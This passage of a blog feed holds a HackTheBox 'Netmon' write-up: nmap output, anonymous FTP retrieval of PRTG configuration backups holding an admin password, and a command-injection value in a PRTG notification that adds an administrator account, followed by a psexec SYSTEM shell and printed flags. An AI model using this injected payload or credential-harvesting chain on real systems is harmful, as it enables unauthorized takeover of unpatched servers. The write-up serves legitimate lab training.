+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 52.39 seconds
+
+				 nmap -sV -A --script=default,vuln -p 445 10.10.10.152
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+
+Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-07 18:54 IST
+Nmap scan report for 10.10.10.152 (10.10.10.152)
+Host is up (0.21s latency).
+
+PORT    STATE SERVICE      VERSION
+445/tcp open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
+Service Info: OS: Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 8m04s, deviation: 0s, median: 8m04s
+|_samba-vuln-cve-2012-1182: No accounts left to try
+| smb-security-mode: 
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_smb-vuln-ms10-054: false
+|_smb-vuln-ms10-061: No accounts left to try
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2020-12-07T13:32:32
+|_  start_date: 2020-12-07T13:15:52
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 40.78 seconds
+
+[+] Summary 
+21      ftp     Microsoft ftpd N/A
+				No vuln found
+80      http    Indy httpd 18.1.37.13946
+				No vuln found
+135     msrpc   Microsoft Windows RPC N/A
+				No vuln found
+139     netbios-ssn     Microsoft Windows netbios-ssn N/A
+				No vuln found
+445     microsoft-ds    Microsoft Windows Server 2008 R2 - 2012 microsoft-ds N/A
+				No vuln found
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h1 id=&quot;ftp-service-enumeration&quot;&gt;FTP Service Enumeration&lt;/h1&gt;
+&lt;p&gt;The target had been configured to allow &lt;strong&gt;anonymous&lt;/strong&gt; access to everyone. The FTP service allowed access to the &lt;strong&gt;Users&lt;/strong&gt;
+directory and subsequently to &lt;strong&gt;user.txt&lt;/strong&gt;. The user flag file was transferred to the attacking host through &lt;em&gt;get&lt;/em&gt; 
+command, and the flag was read.
+The same is shown on the section given below along with a screenshot.&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;➜  Netmon ftp 10.10.10.152
+Connected to 10.10.10.152.
+220 Microsoft FTP Service
+Name &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.10.152:b4bygroot&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: anonymous
+331 Anonymous access allowed, send identity &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;e-mail name&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; as password.
+Password: 
+230 User logged &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Remote system &lt;span class=&quot;nb&quot;&gt;type &lt;/span&gt;is Windows_NT.
+ftp&amp;gt; &lt;span class=&quot;nb&quot;&gt;ls
+&lt;/span&gt;200 PORT &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;successful.
+125 Data connection already open&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Transfer starting.
+02-02-19  11:18PM                 1024 .rnd
+02-25-19  09:15PM       &amp;lt;DIR&amp;gt;          inetpub
+07-16-16  08:18AM       &amp;lt;DIR&amp;gt;          PerfLogs
+02-25-19  09:56PM       &amp;lt;DIR&amp;gt;          Program Files
+02-02-19  11:28PM       &amp;lt;DIR&amp;gt;          Program Files &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;x86&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+02-03-19  07:08AM       &amp;lt;DIR&amp;gt;          Users
+02-25-19  10:49PM       &amp;lt;DIR&amp;gt;          Windows
+226 Transfer complete.
+ftp&amp;gt; &lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;Users
+250 CWD &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;successful.
+ftp&amp;gt; &lt;span class=&quot;nb&quot;&gt;ls
+&lt;/span&gt;200 PORT &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;successful.
+125 Data connection already open&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Transfer starting.
+02-25-19  10:44PM       &amp;lt;DIR&amp;gt;          Administrator
+02-02-19  11:35PM       &amp;lt;DIR&amp;gt;          Public
+226 Transfer complete.
+ftp&amp;gt; &lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;Public
+250 CWD &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;successful.
+ftp&amp;gt; &lt;span class=&quot;nb&quot;&gt;ls
+&lt;/span&gt;200 PORT &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;successful.
+125 Data connection already open&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Transfer starting.
+02-03-19  07:05AM       &amp;lt;DIR&amp;gt;          Documents
+07-16-16  08:18AM       &amp;lt;DIR&amp;gt;          Downloads
+07-16-16  08:18AM       &amp;lt;DIR&amp;gt;          Music
+07-16-16  08:18AM       &amp;lt;DIR&amp;gt;          Pictures
+02-02-19  11:35PM                   33 user.txt
+07-16-16  08:18AM       &amp;lt;DIR&amp;gt;          Videos
+226 Transfer complete.
+ftp&amp;gt; get user.txt
+200 PORT &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;successful.
+125 Data connection already open&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Transfer starting.
+WARNING! 1 bare linefeeds received &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;ASCII mode
+File may not have transferred correctly.
+226 Transfer complete.
+33 bytes received &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;0.205 seconds &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;161 bytes/s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ftp&amp;gt; bye
+➜  Netmon &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;user.txt 
+dd58ce67b49e15105e88096c8d9255a5
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/images/Netmon/user.png&quot; alt=&quot;user&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;/h1&gt;
+&lt;p&gt;Browsing to &lt;a href=&quot;http://10.10.10.152&quot;&gt;http://10.10.10.152&lt;/a&gt;, revealed a login page to &lt;strong&gt;PRTG Network Monitor&lt;/strong&gt;. After few 
+failed attempts with default and lazy admin credentials, the reasonable path seemed liked enumerating more for credentials.
+As the FTP service gave direct access to the &lt;strong&gt;&lt;em&gt;OS installation&lt;/em&gt;&lt;/strong&gt; drive, &lt;strong&gt;C:&lt;/strong&gt;, a search for sensitive files was carried out.
+After a substantial amount of browsing through files, four sensitive files were identified on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/Users/All Users/Paessler/PRTG Network Monitor&lt;/code&gt;,
+namely &lt;em&gt;PRTG Configuration.dat, PRTG Configuration.old, PRTG Configuration.old.bak, PRTG Graph Data Cache.dat&lt;/em&gt;.
+The files were transferred to the attacking host using &lt;em&gt;get&lt;/em&gt; command, and then searched for any sensitive data.&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ftp&amp;gt; &lt;span class=&quot;nb&quot;&gt;pwd
+&lt;/span&gt;257 &lt;span class=&quot;s2&quot;&gt;&quot;/Users/All Users/Paessler/PRTG Network Monitor&quot;&lt;/span&gt; is current directory.
+ftp&amp;gt; &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-al&lt;/span&gt;
+200 PORT &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;successful.
+125 Data connection already open&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Transfer starting.
+12-07-20  08:57AM       &amp;lt;DIR&amp;gt;          Configuration Auto-Backups
+12-07-20  08:16AM       &amp;lt;DIR&amp;gt;          Log Database
+02-02-19  11:18PM       &amp;lt;DIR&amp;gt;          Logs &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Debug&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+02-02-19  11:18PM       &amp;lt;DIR&amp;gt;          Logs &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Sensors&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+02-02-19  11:18PM       &amp;lt;DIR&amp;gt;          Logs &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;System&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+12-07-20  08:16AM       &amp;lt;DIR&amp;gt;          Logs &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Web Server&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+12-07-20  08:21AM       &amp;lt;DIR&amp;gt;          Monitoring Database
+02-25-19  09:54PM              1189697 PRTG Configuration.dat
+02-25-19  09:54PM              1189697 PRTG Configuration.old
+07-14-18  02:13AM              1153755 PRTG Configuration.old.bak
+12-07-20  01:09PM              1721850 PRTG Graph Data Cache.dat
+02-25-19  10:00PM       &amp;lt;DIR&amp;gt;          Report PDFs
+02-02-19  11:18PM       &amp;lt;DIR&amp;gt;          System Information Database
+02-02-19  11:40PM       &amp;lt;DIR&amp;gt;          Ticket Database
+02-02-19  11:18PM       &amp;lt;DIR&amp;gt;          ToDo Database
+226 Transfer complete.
+ftp&amp;gt; get &lt;span class=&quot;s2&quot;&gt;&quot;PRTG Configuration.dat&quot;&lt;/span&gt;
+200 PORT &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;successful.
+125 Data connection already open&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Transfer starting.
+226 Transfer complete.
+1189697 bytes received &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;3.01 seconds &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;386 kbytes/s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ftp&amp;gt; get &lt;span class=&quot;s2&quot;&gt;&quot;PRTG Configuration.old&quot;&lt;/span&gt;
+200 PORT &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;successful.
+125 Data connection already open&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Transfer starting.
+226 Transfer complete.
+1189697 bytes received &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;2.82 seconds &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;412 kbytes/s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ftp&amp;gt; get &lt;span class=&quot;s2&quot;&gt;&quot;PRTG Configuration.old.bak&quot;&lt;/span&gt;
+200 PORT &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;successful.
+125 Data connection already open&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Transfer starting.
+226 Transfer complete.
+1153755 bytes received &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;2.57 seconds &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;439 kbytes/s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ftp&amp;gt; get &lt;span class=&quot;s2&quot;&gt;&quot;PRTG Graph Data Cache.dat&quot;&lt;/span&gt;
+200 PORT &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;successful.
+125 Data connection already open&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Transfer starting.
+WARNING! 574 bare linefeeds received &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;ASCII mode
+File may not have transferred correctly.
+226 Transfer complete.
+1721850 bytes received &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;3.68 seconds &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;457 kbytes/s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;A quick google search had revealed the admin username for PRTG Network Monitor as &lt;strong&gt;prtgadmin&lt;/strong&gt;. Searching for the 
+pattern on the transferred files revealed a password &lt;strong&gt;PrTg@dmin2018&lt;/strong&gt; on the file &lt;strong&gt;PRTG Configuration.old.bak&lt;/strong&gt;. The 
+same is shown on the section given below.&lt;/p&gt;
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;~/HTB/Tracks/Beginner/Netmon  &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;PRTG&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;prtgadmin&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; 1 &lt;span class=&quot;nt&quot;&gt;-B&lt;/span&gt; 1  
+				&amp;lt;login&amp;gt;
+				  prtgadmin
+				&amp;lt;/login&amp;gt;
+&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;
+				&amp;lt;login&amp;gt;
+				  prtgadmin
+				&amp;lt;/login&amp;gt;
+&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;
+			&amp;lt;dbpassword&amp;gt;
+			  &amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; User: prtgadmin &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+			  PrTg@dmin2018
+&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;
+				&amp;lt;login&amp;gt;
+				  prtgadmin
+				&amp;lt;/login&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Using the credentials &lt;strong&gt;prtgadmin:PrTg@admin2018&lt;/strong&gt; resulted in a failed attempt. Considering the fact that this was 
+found on a backup file, another attempt was carried out with changing the year to 2019. The credentials 
+&lt;strong&gt;prtgadmin:PrTg@2019&lt;/strong&gt; had worked and gave admin access to the PRTG Network Monitor application.&lt;br /&gt;
+The logged-in session had revealed the current version of the installation as &lt;strong&gt;18.1.37.13946&lt;/strong&gt;. &lt;em&gt;Google-Fu&lt;/em&gt; had
+revealed a &lt;strong&gt;Remote Command Execution&lt;/strong&gt;&lt;sup id=&quot;fnref:fn2&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:fn2&quot; class=&quot;footnote&quot;&gt;2&lt;/a&gt;&lt;/sup&gt; vulnerability on versions prior to &lt;strong&gt;18.2.39&lt;/strong&gt;. Following the steps, a new
+notification was created by browsing through &lt;em&gt;Home&lt;/em&gt; -&amp;gt; &lt;em&gt;Setup&lt;/em&gt; -&amp;gt; &lt;em&gt;Account Settings&lt;/em&gt; -&amp;gt; &lt;em&gt;New Notifications&lt;/em&gt;. The command 
+to be executed is to be placed on &lt;strong&gt;Parameter&lt;/strong&gt; box from the &lt;strong&gt;Execute Program&lt;/strong&gt; section. For the purpose of elevating 
+privileges, commands to add a new SYSTEM user, &lt;strong&gt;offsec&lt;/strong&gt;, were added to the &lt;em&gt;parameter&lt;/em&gt; as
+&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user.txt;net user offsec Netmon! /add;net localgroup administrators offsec /add&lt;/code&gt;. 
+A screenshot ‘Execute Program’ section with the parameter added is shown below.
+&lt;img src=&quot;/assets/images/Netmon/AddUser.png&quot; alt=&quot;Add User&quot; /&gt;
+The command was then executed on the target by generating the newly created notification. 
+&lt;img src=&quot;/assets/images/Netmon/generateNoti.png&quot; alt=&quot;Generate Notification&quot; /&gt;
+Now that a new SYSTEM user had been added to the target, the target was accessed using &lt;strong&gt;psexec.py&lt;/strong&gt; through the 
+command &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;psexec.py 'offsec:Netmon!@10.10.10.152'&lt;/code&gt;. This gave complete access to the target with elevated privileges, 
+along with access to the &lt;em&gt;root&lt;/em&gt; flag. The same is shown on the section below.&lt;/p&gt;
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;➜  Netmon psexec.py &lt;span class=&quot;s1&quot;&gt;'offsec:Netmon!@10.10.10.152'&lt;/span&gt;
+Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Requesting shares on 10.10.10.152.....
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Found writable share ADMIN&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Uploading file oNtCnyqM.exe
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Opening SVCManager on 10.10.10.152.....
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Creating service buNb on 10.10.10.152.....
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Starting service buNb.....
+&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; Press &lt;span class=&quot;nb&quot;&gt;help &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;extra shell commands
+Microsoft Windows &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Version 10.0.14393]
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2016 Microsoft Corporation. All rights reserved.
+
+C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem32&amp;gt;cd C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop
+ 
+C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&amp;gt;dir
+ Volume &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;drive C has no label.
+ Volume Serial Number is 684B-9CE8
+
+ Directory of C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop
+
+02/02/2019  11:35 PM    &amp;lt;DIR&amp;gt;          &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+02/02/2019  11:35 PM    &amp;lt;DIR&amp;gt;          ..
+02/02/2019  11:35 PM                33 root.txt
+			   1 File&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;             33 bytes
+			   2 Dir&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;  12,062,781,440 bytes free
+
+C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&amp;gt;type root.txt
+3018977fb944bf1878f75b879fba67cc
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/images/Netmon/SYSTEMShell.png&quot; alt=&quot;SYSTEM Shell&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;system-owned&quot;&gt;System Owned&lt;/h1&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/images/Netmon/systemown.png&quot; alt=&quot;System Own&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;resources&quot;&gt;Resources&lt;/h1&gt;
+&lt;div class=&quot;footnotes&quot; role=&quot;doc-endnotes&quot;&gt;
+  &lt;ol&gt;
+    &lt;li id=&quot;fn:fn1&quot; role=&quot;doc-endnote&quot;&gt;
+      &lt;p&gt;&lt;a href=&quot;https://github.com/b4bygroot/TargetRecon&quot;&gt;targetRecon&lt;/a&gt; &lt;a href=&quot;#fnref:fn1&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+    &lt;/li&gt;
+    &lt;li id=&quot;fn:fn2&quot; role=&quot;doc-endnote&quot;&gt;
+      &lt;p&gt;&lt;a href=&quot;https://www.codewatch.org/blog/?p=453&quot;&gt;PRTG &amp;lt; 18.2.39 Command Injection Vulnerability&lt;/a&gt; &lt;a href=&quot;#fnref:fn2&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+    &lt;/li&gt;
+  &lt;/ol&gt;
+&lt;/div&gt;</content><author><name>b4bygroot</name></author><category term="HTB" /><category term="Writeup" /><category term="Machine" /><category term="Windows" /><category term="Anonymous FTP login" /><category term="PRTG Network Monitor" /><category term="RCE" /><summary type="html">A retired windows box from HackTheBox, gained foothold by abusing anonymous FTP login, and then elevated privileges through authenticated RCE exploit on PRTG Network Monitor.</summary></entry><entry><title type="html">Jerry Machine Writeup- HackTheBox</title><link href="http://localhost:4000/2020/12/03/HTB_Jerry_Writeup/" rel="alternate" type="text/html" title="Jerry Machine Writeup- HackTheBox" /><published>2020-12-03T16:00:00+05:30</published><updated>2020-12-03T16:00:00+05:30</updated><id>http://localhost:4000/2020/12/03/HTB_Jerry_Writeup</id><content type="html" xml:base="http://localhost:4000/2020/12/03/HTB_Jerry_Writeup/">&lt;p&gt;&lt;img src=&quot;/assets/images/Jerry/info.png&quot; alt=&quot;Info&quot; /&gt;&lt;/p&gt;
 
 &lt;h1 id=&quot;methodology&quot;&gt;Methodology&lt;/h1&gt;
 &lt;ol&gt;
